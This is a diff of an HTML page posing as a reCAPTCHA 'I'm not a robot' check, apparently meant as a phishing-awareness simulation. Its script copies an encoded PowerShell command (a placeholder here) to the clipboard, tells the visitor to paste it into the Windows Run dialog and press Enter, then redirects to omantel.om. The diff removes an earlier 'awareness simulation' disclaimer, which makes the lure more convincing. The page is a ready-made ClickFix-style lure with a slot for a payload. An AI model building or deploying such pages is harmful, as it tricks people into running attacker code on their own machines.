@@ -1,136 +1,112 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Verification Awareness Simulation</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verify You Are Human</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f7f7f7;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
+      justify-content: center;
       height: 100vh;
     }
-    .container {
-      background: #fff;
+    .card {
+      background: white;
       padding: 30px;
-      border: 1px solid #ccc;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      text-align: center;
       max-width: 400px;
       width: 100%;
-      border-radius: 8px;
     }
-    h2 {
-      text-align: center;
-      color: #444;
+    h1 {
+      color: #4285f4;
+      font-size: 24px;
+      margin-bottom: 10px;
     }
-    .field {
-      margin-bottom: 15px;
-    }
-    label {
-      display: block;
-      margin-bottom: 5px;
+    p {
       color: #555;
     }
-    input[type="text"], input[type="email"] {
-      width: 100%;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-    .captcha-box {
-      display: flex;
-      align-items: center;
-      border: 1px solid #d3d3d3;
-      padding: 10px;
-      border-radius: 4px;
-      margin-bottom: 15px;
-    }
-    .captcha-box img {
-      margin-left: auto;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background-color: #4285f4;
-      border: none;
-      color: #fff;
+    .recaptcha-btn {
+      margin-top: 20px;
+      padding: 12px 20px;
       font-size: 16px;
-      border-radius: 4px;
+      background-color: #4285f4;
+      color: white;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
     }
-    .disclaimer {
-      font-size: 12px;
-      color: #888;
-      text-align: center;
-      margin-top: 15px;
+    .steps {
+      margin-top: 20px;
+      background: #fff;
+      border-radius: 8px;
+      padding: 15px;
+      text-align: left;
+      font-size: 15px;
+      line-height: 1.6;
+      color: #333;
+      display: none;
+    }
+    .steps span {
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>reCAPTCHA Verification</h2>
-    <form onsubmit="verify(); return false;">
-      <div class="field">
-        <label for="fname">First Name</label>
-        <input type="text" id="fname" required>
-      </div>
-      <div class="field">
-        <label for="lname">Last Name</label>
-        <input type="text" id="lname" required>
-      </div>
-      <div class="field">
-        <label for="email">Email</label>
-        <input type="email" id="email" required>
-      </div>
-      <div class="captcha-box">
-        <input type="checkbox" id="robotCheck" required>
-        <label for="robotCheck">I'm not a robot</label>
-        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width="24">
-      </div>
-      <button type="submit">Verify</button>
-    </form>
-    <p class="disclaimer">
-      This is an awareness simulation page for training purposes only. No data is submitted or collected.
-    </p>
-  </div>
 
-  <script>
-    function verify() {
-      var cmd = 'powershell.exe -e <INSERT_ENCODED_COMMAND>'; // Replace this with your payload
+<div class="card" id="captchaCard">
+  <h1>Verify You Are Human</h1>
+  <p>Please verify that you are a human to continue.</p>
+  <button class="recaptcha-btn" onclick="showSteps()">I'm not a robot</button>
+</div>
 
-      // Try modern clipboard API
-      if (navigator.clipboard && navigator.clipboard.writeText) {
-        navigator.clipboard.writeText(cmd).then(function () {
-          alert("Verification complete. Please press Win + R and paste the command to continue.");
-          setTimeout(() => {
-            window.location.href = "https://www.omantel.om";
-          }, 5000);
-        }).catch(function () {
-          fallbackCopy(cmd);
-        });
-      } else {
-        fallbackCopy(cmd);
-      }
+<div class="card steps" id="stepCard">
+  <h2>Verification Steps</h2>
+  <ol>
+    <li>Press <span>Windows + R</span></li>
+    <li>Press <span>CTRL + V</span> to paste the copied command</li>
+    <li>Press <span>Enter</span></li>
+  </ol>
+</div>
+
+<script>
+  function showSteps() {
+    const cmd = '[SIMULATION] powershell.exe -e ABC123... (placeholder)';
+
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(cmd).then(() => {
+        document.getElementById("captchaCard").style.display = "none";
+        document.getElementById("stepCard").style.display = "block";
+        setTimeout(() => {
+          window.location.href = "https://www.omantel.om";
+        }, 8000);
+      }).catch(() => fallbackCopy(cmd));
+    } else {
+      fallbackCopy(cmd);
     }
+  }
 
-    function fallbackCopy(cmd) {
-      try {
-        var textarea = document.createElement('textarea');
-        textarea.value = cmd;
-        document.body.appendChild(textarea);
-        textarea.select();
-        document.execCommand('copy');
-        document.body.removeChild(textarea);
-      } catch (err) {
-        console.error("Fallback copy failed:", err);
-      }
-      alert("Verification complete. Please press Win + R and paste the command to continue.");
-      setTimeout(() => {
-        window.location.href = "https://www.omantel.om";
-      }, 5000);
-    }
-  </script>
+  function fallbackCopy(text) {
+    const textarea = document.createElement("textarea");
+    textarea.value = text;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+    document.body.removeChild(textarea);
+    document.getElementById("captchaCard").style.display = "none";
+    document.getElementById("stepCard").style.display = "block";
+    setTimeout(() => {
+      window.location.href = "https://www.omantel.om";
+    }, 8000);
+  }
+</script>
+
 </body>
 </html>
